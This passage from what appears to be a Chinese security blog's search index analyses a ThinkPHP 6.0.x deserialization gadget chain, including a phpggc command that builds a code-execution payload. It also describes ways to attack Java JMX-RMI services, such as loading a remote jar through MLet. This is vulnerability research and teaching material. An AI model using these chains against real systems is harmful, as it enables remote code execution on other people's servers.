\u5229\u7528\u94fe\u5206\u6790","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#_1","title":"\u80cc\u666f\u56de\u987e","text":"<p>\u62ff\u5230v6.0.x\u7248\u672c\uff0c\u7b80\u5355\u7684\u770b\u4e86\u4e00\u4e0b\uff0c\u6709\u4e00\u4e2a\u597d\u6d88\u606f\u548c\u4e00\u4e2a\u574f\u6d88\u606f\u3002</p> <p>\u597d\u6d88\u606f\u662f5.2.x\u7248\u672c\u51fd\u6570\u52a8\u6001\u8c03\u7528\u7684\u53cd\u5e8f\u5217\u5316\u94fe\u540e\u534a\u90e8\u5206\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528\u3002</p> <p>\u574f\u6d88\u606f\u662f\u524d\u97625.1.x\uff0c5.2.x\u7248\u672c\u90fd\u57fa\u4e8e\u89e6\u53d1\u70b9<code>Windows</code>\u7c7b\u7684<code>__destruct</code>,\u597d\u5de7\u4e0d\u5de7\u7684\u662f6.0.x\u7248\u672c\u53d6\u6d88\u4e86<code>Windows</code>\u7c7b\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5f97\u91cd\u65b0\u627e\u4e00\u4e2a\u5408\u9002\u7684\u8d77\u59cb\u89e6\u53d1\u70b9\uff0c\u624d\u80fd\u7ee7\u7eed\u4f7f\u7528\u4e0a\u9762\u7684\u597d\u6d88\u606f\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#vendortopthinkthink-ormsrcmodelphp","title":"vendor/topthink/think-orm/src/Model.php \u65b0\u8d77\u59cb\u89e6\u53d1\u70b9","text":"<p>\u4e3a\u4e86\u8282\u7701\u7bc7\u5e45\uff0c\u540e\u6587\u4e0d\u518d\u91cd\u590d\u4ecb\u7ecd\u89e6\u53d1<code>__toString</code>\u51fd\u6570\u540e\u7684\u5229\u7528\u94fe\uff0c\u8fd9\u90e8\u5206\u540c5.2.x\u7248\u672c\u76f8\u540c(\u4e0d\u8fc7wonderkun\u5e08\u5085\u7684\u5229\u7528\u94fe\u5df2\u5931\u6548\uff0c\u52a8\u6001\u51fd\u6570\u8c03\u7528\u7684\u5229\u7528\u94fe\u8fd8\u80fd\u7528)\u3002</p> <p>\u901a\u5e38\u6700\u597d\u7684\u53cd\u5e8f\u5217\u5316\u8d77\u59cb\u70b9\u4e3a<code>__destruct</code>\u3001<code>__wakeup</code>\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u51fd\u6570\u7684\u8c03\u7528\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u90fd\u4f1a\u81ea\u52a8\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u6765\u627e\u6b64\u7c7b\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u627e\u4e86<code>vendor/topthink/think-orm/src/Model.php</code>\u7684<code>__destruct</code>\u51fd\u6570\u3002</p> <pre><code>public function __destruct()\n{\n    if ($this-&gt;lazySave) {// \u6784\u9020lazySave\u4e3atrue\uff0c\u8fdb\u5165save\u51fd\u6570\n        $this-&gt;save();\n    }\n}\n\npublic function save(array $data = [], string $sequence = null): bool\n{\n  // ...\n  if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) {\n    return false;\n  }\n\n  $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);\n  // ...\n}\n</code></pre> <p>\u9996\u5148\u6784\u9020<code>lazySave</code>\u7684\u503c\u4e3a<code>true</code>,\u4ece\u800c\u8fdb\u5165<code>save</code>\u51fd\u6570\u3002</p> <p>\u8fd9\u6b21\u89e6\u53d1\u70b9\u4f4d\u4e8e<code>updateData</code>\u51fd\u6570\u5185\uff0c\u4e3a\u4e86\u9632\u6b62\u524d\u9762\u7684\u6761\u4ef6\u7b26\u5408\uff0c\u800c\u76f4\u63a5return\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u6784\u9020\u76f8\u5173\u53c2\u6570</p> <pre><code>public function isEmpty(): bool\n{\n    return empty($this-&gt;data);\n}\n\nprotected function trigger(string $event): bool\n{\n  if (!$this-&gt;withEvent) {\n    return true;\n  }\n  // ...\n</code></pre> <p>\u5176\u4e2d\u9700\u4fdd\u8bc1<code>isEmpty</code>\u8fd4\u56de<code>false</code>\uff0c\u4ee5\u53ca<code>$this-&gt;trigger('BeforeWrite')</code>\u8fd4\u56de<code>true</code></p> <ol> <li>\u6784\u9020<code>$this-&gt;data</code>\u4e3a\u975e\u7a7a\u6570\u7ec4</li> <li>\u6784\u9020<code>$this-&gt;withEvent</code>\u4e3a<code>false</code></li> <li>\u6784\u9020<code>$this-&gt;exists</code>\u4e3a<code>true</code></li> </ol> <p>\u4ece\u800c\u8fdb\u5165\u6211\u4eec\u9700\u8981\u7684<code>updateData</code>\u51fd\u6570\uff0c\u6765\u770b\u4e00\u4e0b\u8be5\u51fd\u6570\u5185\u5bb9</p> <pre><code>protected function updateData(): bool\n{\n    // \u4e8b\u4ef6\u56de\u8c03\n    if (false === $this-&gt;trigger('BeforeUpdate')) {// \u6b64\u5904\u524d\u9762\u5df2\u7b26\u5408\u6761\u4ef6\n        return false;\n    }\n\n    // ...\n\n    // \u83b7\u53d6\u6709\u66f4\u65b0\u7684\u6570\u636e\n    $data = $this-&gt;getChangedData();\n\n    if (empty($data)) {\n        // \u5173\u8054\u66f4\u65b0\n        if (!empty($this-&gt;relationWrite)) {\n            $this-&gt;autoRelationUpdate();\n        }\n        return true;\n    }\n        // ...\n    // \u68c0\u67e5\u5141\u8bb8\u5b57\u6bb5\n    $allowFields = $this-&gt;checkAllowFields(); // \u89e6\u53d1__toString\n</code></pre> <p>\u540c\u6837\u7684\uff0c\u4e3a\u4e86\u9632\u6b62\u63d0\u524d<code>return</code>\uff0c\u9700\u8981\u7b26\u5408<code>$data</code>\u975e\u7a7a\uff0c\u6765\u770b\u4e00\u4e0b<code>getChangedData</code></p> <pre><code>public function getChangedData(): array\n{\n    $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) {\n        if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) {\n            return 1;\n        }\n\n        return is_object($a) || $a != $b ? 1 : 0;\n    });\n\n    // ...\n\n    return $data;\n}\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5f3a\u884c\u7f6e<code>$this-&gt;force</code>\u4e3a<code>true</code>\uff0c\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u524d\u9762\u6784\u9020\u7684\u975e\u7a7a<code>$this-&gt;data</code></p> <p>\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u6210\u529f\u5230\u4e86\u8c03\u7528<code>checkAllowFields</code>\u7684\u4f4d\u7f6e</p> <pre><code>protected function checkAllowFields(): array\n{\n    // \u68c0\u6d4b\u5b57\u6bb5\n    if (empty($this-&gt;field)) {\n        if (!empty($this-&gt;schema)) {\n            $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));\n        } else {\n            $query = $this-&gt;db();// \u6700\u7ec8\u7684\u89e6\u53d1__toString\u7684\u51fd\u6570\n            $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable();\n\n            $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);\n        }\n\n        return $this-&gt;field;\n    }\n        // ...\n}\n</code></pre> <p>\u540c\u6837\uff0c\u4e3a\u4e86\u5230<code>$this-&gt;db()</code>\u51fd\u6570\u7684\u8c03\u7528\uff0c\u9700\u8981</p> <ol> <li>\u6784\u9020<code>$this-&gt;field</code>\u4e3a\u7a7a</li> <li>\u6784\u9020<code>$this-&gt;schema</code>\u4e3a\u7a7a</li> </ol> <p>\u5176\u5b9e\u8fd9\u4e24\u4e2a\u5730\u65b9\u4e0d\u9700\u8981\u6784\u9020\uff0c\u9ed8\u8ba4\u90fd\u4e3a\u7a7a</p> <p>\u6700\u7ec8\uff0c\u6211\u4eec\u7ec8\u4e8e\u5230\u4e86\u53ef\u4ee5\u89e6\u53d1<code>__toString</code>\u7684\u4f4d\u7f6e</p> <pre><code>public function db($scope = []): Query\n{\n    /** @var Query $query */\n    $query = self::$db-&gt;connect($this-&gt;connection)\n        -&gt;name($this-&gt;name . $this-&gt;suffix)// toString\n        -&gt;pk($this-&gt;pk);\n</code></pre> <p>\u770b\u5230\u719f\u6089\u7684\u5b57\u7b26\u4e32\u62fc\u63a5\u4e86\u561b\uff01\uff01\uff01</p> <p>\u4e0d\u8fc7\u4e3a\u4e86\u8fbe\u5230\u8be5\u51fa\u62fc\u63a5\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u9996\u5148\u6ee1\u8db3<code>connect</code>\u51fd\u6570\u7684\u8c03\u7528\u3002\u6b64\u5904\u4ee3\u7801\u5c31\u4e0d\u8bf4\u4e86\uff0c\u7f6e<code>$this-&gt;connection</code>\u4e3a<code>mysql</code>\u5373\u53ef\u3002\u63a5\u4e0b\u6765\uff0c\u4e0d\u7ba1\u662f\u8bbe<code>$this-&gt;name</code>\u8fd8\u662f<code>$this-&gt;suffix</code>\u4e3a\u6700\u7ec8\u7684\u89e6\u53d1<code>__toString</code>\u7684\u5bf9\u8c61\uff0c\u90fd\u4f1a\u6709\u540c\u6837\u7684\u6548\u679c\u3002</p> <p>\u540e\u7eed\u7684\u601d\u8def\uff0c\u5c31\u662f\u539f\u6765<code>vendor/topthink/think-orm/src/model/concern/Conversion.php</code>\u7684<code>__toString</code>\u5f00\u59cb\u7684\u5229\u7528\u94fe\uff0c\u4e0d\u5728\u53d9\u8ff0\u3002</p> <p>\u6211\u628aexp\u96c6\u6210\u5230\u4e86phpggc\u4e0a\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u5373\u53ef\u751f\u6210</p> <pre><code>./phpggc -u ThinkPHP/RCE2 'phpinfo();'\n</code></pre> <p>\u8fd9\u91cc\u7531\u4e8e\u7528\u5230\u4e86SerializableClosure\uff0c\u9700\u8981\u4f7f\u7528\u7f16\u7801\u5668\u7f16\u7801\uff0c\u4e0d\u53ef\u76f4\u63a5\u8f93\u51fa\u62f7\u8d1d\u5229\u7528\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2020/java-jmx-rmi-20200310/","title":"\u653b\u51fbJava JMX-RMI","text":"","tags":["Java"]},{"location":"blog/2020/java-jmx-rmi-20200310/#0x00","title":"0x00 \u524d\u8a00","text":"<p>RMI\u7684\u4e00\u4e2a\u91cd\u8981\u5e94\u7528\u662fJMX(Java Management Extentions)\uff0c\u672c\u6587\u4ecb\u7ecdJMX\u7684\u4e24\u4e2a\u653b\u51fb\u9762\uff1a\uff09</p>","tags":["Java"]},{"location":"blog/2020/java-jmx-rmi-20200310/#0x01","title":"0x01 \u57fa\u7840","text":"<p>\u5728\u5199\u4e00\u534a\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u4e86\u8fd9\u7bc7\u6587\u7ae0\uff0c\u611f\u89c9\u5199\u7684\u5f88\u597d\uff0c\u53ef\u4ee5\u770b\u770b\uff1ahttps://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/</p> <p>JMX</p> <p>Java Management Extensions (JMX) is a Java technology that supplies tools for managing and monitoring applications, system objects, devices (such as printers) and service-oriented networks.</p> <p>MBean</p> <p>JMX allows you to manage resources as managed beans. A managed bean (MBean) is a Java Bean class that follows certain design rules of the JMX standard. An MBean can represent a device, an application, or any resource that needs to be managed over JMX. You can access these MBeans via JMX, query attributes and invoke Bean methods.</p> <p>The JMX standard differs between various MBean types however, we will only deal with the standard MBeans here. To be a valid MBean, a Java class must:</p> <ul> <li>Implement an interface</li> <li>Provide a default constructor (without any arguments)</li> <li>Follow certain naming conventions, for example implement getter/setter methods to read/write attributes</li> </ul> <p>\u8fd9\u91cc\u63d0\u4e00\u4e0b\uff0c\u5f53MBean\u7684\u540d\u5b57\u4e3a<code>Hello</code>\u65f6\uff0c\u5176\u76f8\u5e94\u7684interface\u540d\u5fc5\u987b\u4e3a<code>HelloMBean</code>\uff0c\u4e0d\u7136\u7b97\u4e0d\u5408\u6cd5\u7684MBean</p> <p>MBean Server</p> <p>A MBean server is a service that manages the MBeans of a system. Developers can register their MBeans in the server following a specific naming pattern. The MBean server will forward incoming messages to the registered MBeans. The service is also responsible to forward messages from MBeans to external components.</p> <p>DEMO\u7528\u53c2\u8003\u91cc\u7684\uff0c\u7528<code>jconsole</code>\u770b\u770b\u7ed3\u679c</p> <p></p> <p>\u5728JConsole\u91cc\u53ef\u4ee5\u5bf9\u5f53\u524d\u6ce8\u518c\u7684MBean\u8fdb\u884c\u64cd\u4f5c\uff0c\u5982\u4e0a\u56fe\u8c03\u7528<code>sayHello</code>\u51fd\u6570</p> <p>\u5f53\u524d\u6211\u4eec\u8fde\u7684\u662f\u672c\u5730\u7684MBean Server(\u6bcf\u4e2ajava\u8fdb\u7a0b\u5728\u672c\u5730\u90fd\u4f1a\u6709\u4e00\u4e2aMBean Server)\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06MBean Server\u6302\u8f7d\u5230\u67d0\u4e00\u7aef\u53e3\u4e0a\uff0c\u63d0\u4f9b\u8fdc\u7a0b\u7684MBean\u7ba1\u7406\u3002</p> <p>\u8fd0\u884cjar\u65f6\u5e26\u4e0a<code>-Dcom.sun.management.jmxremote.port=2222 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false</code></p> <p>\u76f4\u63a5\u901a\u8fc7JConsole\u6765\u8fde\u63a5\uff0c\u4f1a\u63d0\u793a\u4f60\u6709\u4e24\u79cd\u65b9\u6cd51:<code>host:port</code>;2:<code>service:jmx:&lt;protocol&gt;:&lt;sap&gt;</code></p> <p>\u8fd9\u91cc\u6211\u4eec\u91cd\u70b9\u8981\u8bb2\u7684\u5c31\u662f\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u9996\u5148\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bjmx\u5efa\u7acb\u8d772222\u7aef\u53e3\u540e\uff0c\u7528nmap\u6765\u83b7\u53d6\u5176\u5185\u5bb9\u662f\u600e\u4e48\u6837\u7684</p> <p></p> <p>\u4ece\u7ed3\u679c\u6765\u770b\uff0cJMX\u7684MBean Server\u662f\u5efa\u7acb\u5728RMI\u7684\u57fa\u7840\u4e0a\u7684\uff0c\u5e76\u4e14\u5176RMI Registy\u6ce8\u518c\u7684\u540d\u5b57\u53eb<code>jmxrmi</code>\u3002</p> <p>\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u5177\u4f53\u7684\u534f\u8bae\u6765\u8ddfServer\u7aef\u8fdb\u884c\u8fde\u63a5\uff0c\u53c2\u8003JMX RMI connector API</p> <p>There are two forms for RMI connector addresses:</p> <ul> <li>In the JNDI form, the URL indicates where to find an RMI stub for the connector. This RMI stub is a Java object of type <code>RMIServer</code> that gives remote access to the connector server. With this address form, the RMI stub is obtained from an external directory entry included in the URL. An external directory is any directory recognized by <code>JNDI</code>, typically the RMI registry, LDAP, or COS Naming.</li> <li>In the encoded form, the URL directly includes the information needed to connect to the connector server. When using RMI/JRMP, the encoded form is the serialized RMI stub for the server object, encoded using BASE64 without embedded newlines. When using RMI/IIOP, the encoded form is the CORBA IOR for the server object.</li> </ul> <p>\u8fd9\u91cc\u7684encoded form\u7684\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u5b9e\u5728\u53d1\u8d77\u7aef\u8fdb\u884c\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u8003\u8651\u7b2c\u4e8c\u79cd\u5f62\u5f0f\u3002</p> <p>\u5bf9\u4e8eJNDI\u7684\u5f62\u5f0f\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u65b9\u6cd5\u8ddfJMX Server\u53bb\u8fde\u63a5\uff1a</p> <p>Connector\u652f\u6301JRMP\u548ciiop\u4f5c\u4e3a\u8fde\u63a5\u5c42\u7684\u534f\u8bae\uff0c\u6240\u4ee5\u5bf9\u5e94\u7684\u6709\u4e24\u79cd\u65b9\u5f0f</p> <pre><code>1. service:jmx:rmi://host:port/\n2. service:jmx:iiop://host:port/\n</code></pre> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u57fa\u4e8e\u76ee\u5f55\u6761\u76ee\u7684connectors</p> <pre><code>1. service:jmx:rmi://host:port/jndi/jndi-name\n2. service:jmx:iiop://host:port/jndi/jndi-name\n\u6bd4\u5982\nserivce:jmx:rmi://&lt;\u53ef\u5ffd\u7565\u7684host&gt;/jndi/rmi://host:port/jmxrmi\n</code></pre> <p>\u8fd9\u79cd\u65b9\u5f0f\u5c31\u53ef\u4ee5\u4f7f\u7528jndi\u4e0b\u7684\u6240\u6709spi\u6765\u8fdb\u884c\u8fde\u63a5</p>","tags":["Java"]},{"location":"blog/2020/java-jmx-rmi-20200310/#0x02-jmx","title":"0x02 \u653b\u51fbJMX","text":"","tags":["Java"]},{"location":"blog/2020/java-jmx-rmi-20200310/#1-jmx-rmi","title":"1. \u653b\u51fbJMX-RMI","text":"<p>CVE-2016-3427 \u7531\u4e8eJMX\u8ba4\u8bc1\u65f6\u4f20\u9012\u7684\u662fHashMap\u6570\u636e\u7ed3\u6784\uff0c\u800c\u4ee5HashMap\u53ef\u4ee5\u76f4\u63a5\u6784\u9020\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6765\u653b\u51fb\u672c\u5730ClassPath\uff0c\u8fd9\u91cc\u5df2\u7ecf\u4fee\u590d\u4e86\u4e0d\u7ec6\u8bb2\u4e86XD</p> <p>\u4e3b\u52a8\u653b\u51fb1\uff1a\u5229\u7528RMI Registy\u6536\u5230\u8fdc\u7a0bbind\u65f6\u4ea7\u751f\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e jdk&lt;8u141_b10(\u5e76\u4e14check host\u7684\u987a\u5e8f\u53d8\u4e86\uff0c\u8be6\u7ec6\u53ef\u4ee5\u770b\u8fd9\u91cc)\uff0c8u141_b10\u4fee\u6539\u540eSingleEntryRegistry\u589e\u52a0\u4e86filter</p> <p></p> <p>\u9650\u5236\u4e86\u63a5\u53d7\u5230\u7684\u4e0d\u80fd\u662f\u5e8f\u5217\u5316\u540e\u7684\u5bf9\u8c61\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u4e0d\u80fd\u5229\u7528registry\u8fd9\u79cd\u65b9\u5f0f\u6765\u8fbe\u6210\u5229\u7528\u4e86\u3002</p> <p>\u4e3b\u52a8\u653b\u51fb2:\u5229\u7528RMI DGC\u5b9e\u73b0\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u53ef\u5728JEP 290\u4e4b\u524d\u7684\u7248\u672c\u653b\u51fb\u6210\u529f(\u4f7f\u7528ysoserial\u7684JRMPClient\uff0c\u5206\u6790\u4e5f\u89c1\u8fd9\u91cc0x08\u90e8\u5206)</p> <p>\u524d\u9762\u4e24\u79cd\u65b9\u5f0f\uff0c\u5728\u6700\u65b0\u7248\u7684JDK8\u4e2d\u5747\u65e9\u5df2\u5931\u6548\u3002\u9664\u4e86\u76f4\u63a5\u653b\u51fbRMI\u5c42\uff0c\u6211\u4eec\u4e5f\u8fd8\u53ef\u4ee5\u5229\u7528MBean Server\u6302\u8f7d\u7684\u5bf9\u8c61\u51fd\u6570\uff0c\u6765\u4f20\u9012\u6784\u9020\u597d\u7684\u5e8f\u5217\u5316\u6570\u636e\u3002\u8fd9\u91cc\u6709\u70b9\u50cfRMI\u4e2d\u5229\u7528RMI Server\u6302\u8f7d\u7684\u5bf9\u8c61\u51fd\u6570\u53c2\u6570\u4e2d\u5b58\u5728\u76f8\u5173\u53ef\u5229\u7528\u7684\u5bf9\u8c61\uff0c\u5982Object\u7c7b\u578b\u5c31\u53ef\u4ee5\u88c5\u8f7d\u6240\u6709\u7684\u5e8f\u5217\u5316\u6570\u636e\u3002</p>","tags":["Java"]},{"location":"blog/2020/java-jmx-rmi-20200310/#2","title":"2. \u653b\u51fb\u5b58\u5728\u51fd\u6570\u53c2\u6570\u7684\u5bf9\u8c61","text":"<p>\u5229\u7528MBean Server\u6302\u8f7d\u7684\u5bf9\u8c61\u51fd\u6570\u53c2\u6570\uff0c\u6765\u4f20\u9012\u6784\u9020\u597d\u7684\u5e8f\u5217\u5316\u6570\u636e\u3002MBean Server\u63a5\u6536\u5230\u6570\u636e\u540e\uff0c\u4f1a\u5bf9\u83b7\u53d6\u5230\u7684\u53c2\u6570\u6570\u636e\u8fdb\u884c<code>object[]</code>\u8f6c\u6362\uff0c\u5728\u8f6c\u6362\u524d\uff0c\u9700\u8981\u5c06RMI\u4ea4\u4e92\u8fc7\u7a0b\u4e2d\u7684\u5e8f\u5217\u5316\u6570\u636e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316</p> <p><code>javax/management/remote/rmi/RMIConnectionImpl.java#unwrap</code></p> <p></p> <p>1583\u884c\u8fdb\u884c\u7c7b\u578b\u8f6c\u5316\uff0c\u4f46\u9996\u5148\u9700\u8981\u5148\u8fdb\u884c\u53cd\u5e8f\u5217\u5316<code>mo.get()</code></p> <p><code>java/rmi/MarshalledObject.java#get</code></p> <p></p> <p>\u8fd9\u91cc\u5c31\u5230\u4e86\u5e38\u89c4\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c</p> <p>\u6240\u4ee5\u53ea\u8981MBean Server\u91cc\u5b58\u5728MBean\u7684\u51fd\u6570\u5b58\u5728\u53c2\u6570\uff0c\u6211\u4eec\u901a\u8fc7\u6784\u9020\u76f8\u5173\u7684invoke\u4f20\u9012\u8fc7\u53bb\u5c31\u53ef\u4ee5\u89e6\u53d1\u53cd\u5e8f\u5217\u5316</p> <p></p> <p>\u5982<code>java.util.logging.Logging#getLoggerLevel(String)</code>\u6709\u4e00\u4e2aString\u7c7b\u578b\u7684\u51fd\u6570\u53c2\u6570\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c06payload\u585e\u8fdbinvoke\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5373\u53ef\u3002</p> <p>\u5176\u4ed6\u7684MBean\u4e5f\u540c\u6837\u53ef\u4ee5\u8fd9\u6837\u64cd\u4f5c\uff0c\u8fd9\u91cc\u5982\u679c\u9700\u8981\u8ba4\u8bc1\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u5728\u8fde\u63a5\u65f6\u5c06\u8ba4\u8bc1\u4fe1\u606f\u5e26\u4e0a\uff0c\u540e\u7eed\u7684\u8fd8\u662f\u53ef\u4ee5\u5229\u7528\u6210\u529f\u7684\u3002</p>","tags":["Java"]},{"location":"blog/2020/java-jmx-rmi-20200310/#3-mletmbean","title":"3. \u5229\u7528MLET\u65b9\u5f0f\u52a8\u6001\u52a0\u8f7dMBean","text":"<p>\u8fd9\u91cc\u5148\u8bf4\u5229\u7528\u65b9\u5f0f\uff1a</p> <p>\u5229\u7528\u6761\u4ef6\uff1a</p> <ol> <li>\u65e0security manager</li> <li>\u65e0\u8ba4\u8bc1</li> </ol> <p>\u5229\u7528\u539f\u7406\uff1a</p> <ol> <li>\u5728\u4e00HTTP Server\u6302\u8f7dmlet\u6587\u4ef6\u548c\u5305\u542bMBean\u7684jar\u6587\u4ef6</li> <li>\u7528<code>createMBean(\"javax.management.loading.MLet\", null);</code>\u7684\u65b9\u5f0f\u5728\u8fdc\u7a0bJMX\u521b\u5efaMLet\u5bf9\u8c61</li> <li>\u4f7f\u7528<code>getMBeansFromURL</code>\u4ece\u8fdc\u7a0bHTTP Server\u52a0\u8f7dmlet\u6587\u4ef6</li> <li>\u89e3\u6790mlet\u6587\u4ef6\uff0c\u7531\u4e8e\u5b58\u5728codebase\uff0c\u4ece\u8fdc\u7a0b\u52a0\u8f7djar\u6587\u4ef6\uff0c\u5e76\u8f7d\u5165\u8be5MBean</li> <li>\u8c03\u7528\u8be5MBean\u7684\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u662f\u81ea\u5b9a\u4e49\u7684\u6267\u884c\u547d\u4ee4\u7b49\u64cd\u4f5c</li> </ol> <p>\u7b80\u5355\u5206\u6790\uff1a</p> <p>\u6765\u7b80\u5355\u8bf4\u4e00\u4e0bMLet\u7684\u539f\u7406\uff0cJMX\u9664\u4e86\u52a0\u8f7d\u672c\u5730\u7684MBean\uff0c\u4e5f\u53ef\u4ee5\u52a0\u8f7d\u8fdc\u7a0b\u7684MLet\u6587\u4ef6(\u5305\u542b\u4e86MLet\u6807\u7b7e)\u6765\u52a8\u6001\u52a0\u8f7dcodebase\u91cc\u7684Jar\u6587\u4ef6\u3002\u540e\u8005\u5c31\u662f\u901a\u8fc7MLet\u5bf9\u8c61\u7684getMBeansFromURL\u51fd\u6570\u6765\u5b8c\u6210\u7684\u3002</p> <p>\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u7ffb\u4e00\u7ffb<code>javax/management/loading/MLet.java#getMBeansFromURL</code>\uff0c\u8fd9\u91cc\u76f4\u63a5\u8bf4\u4e00\u4e0b\u6d41\u7a0b</p> <ol> <li> <p>\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u52a0\u8f7dMLet\u6587\u4ef6\u5e76\u89e3\u6790\u8be5\u6587\u4ef6</p> </li> <li> <p>\u6839\u636eMLet\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684codebase\u548carchive\u5b57\u6bb5\uff0c\u62fc\u63a5\u6210\u6700\u540e\u8981\u8bf7\u6c42\u7684jar\u6587\u4ef6URL\u5730\u5740</p> </li> <li>\u6700\u540e\u7531URLClassLoader\u6765\u5b8c\u6210\u8bf7\u6c42\u8f7d\u5165\u64cd\u4f5c</li> </ol> <p>\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7b2c2\u6b65\u4e2d\uff0c\u5982\u679c\u5f53\u524d\u7684URL\u5730\u5740\u5df2\u7ecf\u5b58\u5728\u5c06\u4e0d\u518d\u91cd\u65b0\u53d1\u8d77\u8f7d\u5165\u8bf7\u6c42\uff0c\u610f\u5473\u7740\u4e00\u6b21\u8f7d\u5165\u6210\u529f\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u8be5MBean\uff08Server\u4e0d\u91cd\u542f\u7684\u72b6\u6001\u4e0b\uff09\u3002</p> <p>\u800c\u5bf9\u4e8e\u524d\u9762\u63d0\u5230\u7684\u4e24\u4e2a\u5229\u7528\u6761\u4ef6\uff1a</p> <p>\u5728\u6587\u6863\u91cchttps://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html\u63d0\u5230</p> <p>Caution - This configuration is insecure: any remote user who knows (or guesses) your port number and host name will be able to monitor and control your Java applications and platform. Furthermore, possible harm is not limited to the operations you define in your MBeans. A remote client could create a <code>javax.management.loading.MLet</code> MBean and use it to create new MBeans from arbitrary URLs, at least if there is no security manager. In other words, a rogue remote client could make your Java application execute arbitrary code.</p> <p>Consequently, while disabling security might be acceptable for development, it is strongly recommended that you do not disable security for production systems.</p> <p>\u9996\u5148\u5bf9\u4e8e\u6709\u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\uff0c\u8c03\u7528MLet\u5c06\u4f1a\u8fdb\u884c\u6743\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u9a8c\u8bc1\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e0d\u5141\u8bb8\u7684\u3002</p> <p><code>com/sun/jmx/remote/security/MBeanServerFileAccessController.java#checkAccess</code>\u4f1a\u68c0\u67e5\u5f53\u524d\u767b\u9646\u7684\u7528\u6237\u662f\u5426\u6709Create\u7684\u6743\u9650(\u8fd9\u91cc\u7684\u6743\u9650\u662f\u4e0b\u9762\u7684createPatterns\uff0c\u5b83\u5141\u8bb8\u521b\u5efa\u6307\u5b9a\u6b63\u5219\u7684\u7c7b\u578b\uff0c\u800c\u6211\u4eec\u9ed8\u8ba4\u662f\u4e3a\u7a7a\u7684)\uff0c\u8fd9\u91cc\u9ed8\u8ba4\u4f1a\u8fd4\u56defalse\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u5b83\u4e0d\u5141\u8bb8\u4ee5MLet\u5bf9\u8c61\u521b\u5efa\u65b0\u7684MBean</p> <p></p> <p>\u5176\u6b21\u5bf9\u4e8esecurity manager\u7684\u9650\u5236\uff0c\u5728\u8fdc\u7a0b\u8f7d\u5165\u524d\u4f1a\u5224\u65ad\u662f\u5426\u5b58\u5728\u8f7d\u5165\u7684\u6743\u9650\uff08\u8fd9\u91cc\u6211\u6ca1\u770b\u5230\u5176\u4ed6\u7684\u5730\u65b9\u505a\u4e86\u5224\u65ad\uff0c\u53ef\u80fd\u4e0d\u6b62\u5f53\u524d\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u9a8c\u8bc1\uff09</p> <p></p> 